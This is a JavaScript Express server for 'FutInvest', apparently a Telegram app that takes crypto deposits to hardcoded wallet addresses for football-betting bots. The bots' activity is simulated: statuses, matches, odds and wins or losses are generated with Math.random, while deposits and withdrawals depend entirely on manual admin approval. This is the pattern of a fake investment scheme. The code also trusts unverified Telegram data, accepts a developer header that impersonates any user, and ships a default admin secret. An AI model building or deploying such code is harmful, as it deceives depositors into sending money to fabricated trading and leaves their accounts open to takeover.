import express from 'express'
import cors from 'cors'
import { randomUUID } from 'crypto'
import { db } from './db.js'

const app = express()
const PORT = process.env.PORT || 3001
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'muda-isto-para-um-segredo-forte'

const DEPOSIT_ADDRESSES = {
  BTC: '175DBVQbmokQFmbP1xXvChpmQxwCLeiDim',
  ETH: '0x253b6EA9a69D60400C5170022362eebd442bEdF9',
  USDC: '0x253b6EA9a69D60400C5170022362eebd442bEdF9',
}

const BOT_STATUSES = ['idle', 'scanning', 'entry_found', 'in_trade', 'win', 'loss']
const MATCH_POOL = [
  'Arsenal vs Tottenham', 'Man City vs Liverpool', 'Real Madrid vs Valencia',
  'Barcelona vs Atletico', 'Bayern vs Leverkusen', 'Dortmund vs Leipzig',
  'Inter vs Roma', 'Juventus vs Napoli', 'PSG vs Lyon', 'Benfica vs Sporting',
]

app.use(cors())
app.use(express.json())

function getTgUser(req) {
  const initData = req.headers['x-telegram-init-data']
  if (initData) {
    try {
      const params = new URLSearchParams(initData)
      const userStr = params.get('user')
      if (userStr) return JSON.parse(userStr)
    } catch (e) {}
  }
  const devId = req.headers['x-dev-telegram-id']
  if (devId) return { id: devId, first_name: 'Dev', username: 'dev' }
  return null
}

function getOrCreateUser(tg) {
  const data = db.get()
  let user = data.users.find(function (u) { return u.telegram_id === String(tg.id) })
  if (user) return user
  user = {
    id: randomUUID(),
    telegram_id: String(tg.id),
    username: tg.username || null,
    first_name: tg.first_name || null,
    balance: 50,
    total_profit: 0,
    created_at: Date.now(),
  }
  data.users.push(user)
  db.save()
  return user
}

function auth(req, res, next) {
  const tg = getTgUser(req)
  if (!tg) return res.status(401).json({ error: 'Unauthorized' })
  req.user = getOrCreateUser(tg)
  next()
}

function admin(req, res, next) {
  if (req.headers['x-admin-secret'] !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Forbidden' })
  }
  next()
}

const liveBots = {}

function ensureLiveBots() {
  const data = db.get()
  const active = data.bots.filter(function (b) { return b.active })
  const ids = {}
  active.forEach(function (b) { ids[b.id] = true })
  Object.keys(liveBots).forEach(function (id) {
    if (!ids[id]) delete liveBots[id]
  })
  active.forEach(function (b) {
    if (!liveBots[b.id]) {
      liveBots[b.id] = {
        id: b.id,
        name: b.name,
        league: b.league,
        stake: b.stake,
        active: b.active,
        status: 'scanning',
        currentMatch: null,
        odd: 0,
        profit: null,
        lastUpdate: Date.now(),
      }
    }
  })
}

ensureLiveBots()

setInterval(function () {
  ensureLiveBots()
  Object.keys(liveBots).forEach(function (id) {
    if (Math.random() > 0.5) return
    const bot = liveBots[id]
    const idx = BOT_STATUSES.indexOf(bot.status)
    const next = BOT_STATUSES[(idx + 1) % BOT_STATUSES.length]
    bot.status = next
    bot.lastUpdate = Date.now()
    if (next === 'entry_found' || next === 'in_trade') {
      bot.currentMatch = MATCH_POOL[Math.floor(Math.random() * MATCH_POOL.length)]
      bot.odd = +(1.45 + Math.random() * 1.1).toFixed(2)
    }
    if (next === 'win') bot.profit = +(bot.stake * (bot.odd - 1)).toFixed(2)
    if (next === 'loss') bot.profit = -bot.stake
    if (next === 'idle' || next === 'scanning') {
      bot.currentMatch = null
      bot.profit = null
      bot.odd = 0
    }
  })
}, 5000)

app.get('/api/health', function (req, res) {
  res.json({ ok: true, time: Date.now() })
})

app.get('/api/deposit-addresses', function (req, res) {
  res.json(DEPOSIT_ADDRESSES)
})

app.get('/api/me', auth, function (req, res) {
  const data = db.get()
  const txs = data.transactions
    .filter(function (t) { return t.user_id === req.user.id })
    .sort(function (a, b) { return b.created_at - a.created_at })
    .slice(0, 40)
  res.json({
    id: req.user.id,
    firstName: req.user.first_name,
    username: req.user.username,
    balance: req.user.balance,
    totalProfit: req.user.total_profit,
    transactions: txs,
  })
})

app.get('/api/bots/live', auth, function (req, res) {
  ensureLiveBots()
  res.json(Object.keys(liveBots).map(function (id) { return liveBots[id] }))
})

app.get('/api/history', auth, function (req, res) {
  res.json(db.get().match_history)
})

app.post('/api/deposit-request', auth, function (req, res) {
  const coin = req.body.coin
  const amount = req.body.amount
  const txHash = req.body.txHash
  if (['BTC', 'ETH', 'USDC'].indexOf(coin) < 0) {
    return res.status(400).json({ error: 'Invalid coin' })
  }
  const data = db.get()
  const id = randomUUID()
  data.deposit_requests.push({
    id: id,
    user_id: req.user.id,
    coin: coin,
    amount: amount || null,
    tx_hash: txHash || null,
    status: 'pending',
    created_at: Date.now(),
  })
  db.save()
  res.json({ ok: true, id: id })
})

app.post('/api/withdraw', auth, function (req, res) {
  const amt = parseFloat(req.body.amount)
  const network = req.body.network || 'USDC'
  const address = req.body.address
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Invalid amount' })
  if (!address || address.length < 15) return res.status(400).json({ error: 'Invalid address' })

  const data = db.get()
  const user = data.users.find(function (u) { return u.id === req.user.id })
  if (!user || user.balance < amt) return res.status(400).json({ error: 'Insufficient balance' })

  user.balance -= amt
  const id = randomUUID()
  data.withdraw_requests.push({
    id: id,
    user_id: user.id,
    amount: amt,
    network: network,
    address: address,
    status: 'pending',
    created_at: Date.now(),
  })
  data.transactions.push({
    id: randomUUID(),
    user_id: user.id,
    type: 'withdraw',
    amount: -amt,
    description: 'Saque ' + network + ' -> ' + address.slice(0, 8) + '...',
    created_at: Date.now(),
  })
  db.save()
  res.json({ ok: true, id: id })
})

app.get('/api/admin/pending-deposits', admin, function (req, res) {
  const data = db.get()
  const rows = data.deposit_requests
    .filter(function (d) { return d.status === 'pending' })
    .map(function (d) {
      const u = data.users.find(function (x) { return x.id === d.user_id }) || {}
      return Object.assign({}, d, {
        telegram_id: u.telegram_id,
        username: u.username,
        first_name: u.first_name,
      })
    })
  res.json(rows)
})

app.get('/api/admin/pending-withdrawals', admin, function (req, res) {
  const data = db.get()
  const rows = data.withdraw_requests
    .filter(function (w) { return w.status === 'pending' })
    .map(function (w) {
      const u = data.users.find(function (x) { return x.id === w.user_id }) || {}
      return Object.assign({}, w, {
        telegram_id: u.telegram_id,
        username: u.username,
        first_name: u.first_name,
      })
    })
  res.json(rows)
})

app.post('/api/admin/credit-deposit', admin, function (req, res) {
  const depositId = req.body.depositId
  const amount = req.body.amount
  const data = db.get()
  const dep = data.deposit_requests.find(function (d) { return d.id === depositId })
  if (!dep || dep.status !== 'pending') return res.status(400).json({ error: 'Invalid deposit' })
  const user = data.users.find(function (u) { return u.id === dep.user_id })
  if (!user) return res.status(404).json({ error: 'User not found' })
  user.balance += amount
  dep.status = 'credited'
  dep.amount = amount
  data.transactions.push({
    id: randomUUID(),
    user_id: user.id,
    type: 'deposit',
    amount: amount,
    description: 'Deposito ' + dep.coin + ' confirmado',
    created_at: Date.now(),
  })
  db.save()
  res.json({ ok: true })
})

app.post('/api/admin/process-withdraw', admin, function (req, res) {
  const withdrawId = req.body.withdrawId
  const action = req.body.action
  const data = db.get()
  const w = data.withdraw_requests.find(function (x) { return x.id === withdrawId })
  if (!w || w.status !== 'pending') return res.status(400).json({ error: 'Invalid' })
  if (action === 'complete') {
    w.status = 'completed'
  } else {
    const user = data.users.find(function (u) { return u.id === w.user_id })
    if (user) user.balance += w.amount
    w.status = 'rejected'
    data.transactions.push({
      id: randomUUID(),
      user_id: w.user_id,
      type: 'deposit',
      amount: w.amount,
      description: 'Saque rejeitado - valor devolvido',
      created_at: Date.now(),
    })
  }
  db.save()
  res.json({ ok: true })
})

app.get('/api/admin/users', admin, function (req, res) {
  res.json(db.get().users)
})

app.get('/api/admin/bots', admin, function (req, res) {
  ensureLiveBots()
  const bots = db.get().bots.map(function (b) {
    const l = liveBots[b.id]
    return Object.assign({}, b, {
      status: (l && l.status) || 'idle',
      currentMatch: (l && l.currentMatch) || null,
      odd: (l && l.odd) || 0,
      profit: l ? l.profit : null,
      lastUpdate: (l && l.lastUpdate) || null,
    })
  })
  res.json(bots)
})

app.post('/api/admin/bots', admin, function (req, res) {
  const name = req.body.name
  const league = req.body.league
  const stake = parseFloat(req.body.stake) || 10
  if (!name || !league) return res.status(400).json({ error: 'name e league obrigatorios' })
  const id = 'b' + randomUUID().replace(/-/g, '').slice(0, 10)
  const bot = { id: id, name: String(name).trim(), league: String(league).trim(), stake: stake, active: 1 }
  db.get().bots.push(bot)
  db.save()
  liveBots[id] = {
    id: id, name: bot.name, league: bot.league, stake: stake, active: 1,
    status: 'scanning', currentMatch: null, odd: 0, profit: null, lastUpdate: Date.now(),
  }
  res.json({ ok: true, id: id })
})

app.put('/api/admin/bots/:id', admin, function (req, res) {
  const data = db.get()
  const bot = data.bots.find(function (b) { return b.id === req.params.id })
  if (!bot) return res.status(404).json({ error: 'Robo nao encontrado' })
  if (req.body.name != null) bot.name = req.body.name
  if (req.body.league != null) bot.league = req.body.league
  if (req.body.stake != null) bot.stake = parseFloat(req.body.stake)
  if (req.body.active != null) bot.active = req.body.active ? 1 : 0
  db.save()
  if (liveBots[bot.id]) {
    liveBots[bot.id].name = bot.name
    liveBots[bot.id].league = bot.league
    liveBots[bot.id].stake = bot.stake
    liveBots[bot.id].active = bot.active
    if (!bot.active) {
      liveBots[bot.id].status = 'idle'
      liveBots[bot.id].currentMatch = null
    }
  } else if (bot.active) {
    liveBots[bot.id] = {
      id: bot.id, name: bot.name, league: bot.league, stake: bot.stake, active: 1,
      status: 'scanning', currentMatch: null, odd: 0, profit: null, lastUpdate: Date.now(),
    }
  }
  res.json({ ok: true })
})

app.delete('/api/admin/bots/:id', admin, function (req, res) {
  const data = db.get()
  const i = data.bots.findIndex(function (b) { return b.id === req.params.id })
  if (i < 0) return res.status(404).json({ error: 'Robo nao encontrado' })
  data.bots.splice(i, 1)
  delete liveBots[req.params.id]
  db.save()
  res.json({ ok: true })
})

app.listen(PORT, function () {
  console.log('FutInvest API on port ' + PORT)
})
